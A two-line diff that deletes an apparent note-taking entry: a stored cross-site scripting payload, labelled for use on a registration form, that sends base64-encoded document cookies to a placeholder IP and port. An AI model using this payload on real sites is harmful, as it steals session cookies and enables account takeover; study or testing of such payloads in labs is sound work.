@@ -1,2 +1,0 @@
-payload on register 
-	<img src=x onerror=this.src="http://<IP>:<PORT>/"+btoa(document.cookie)>
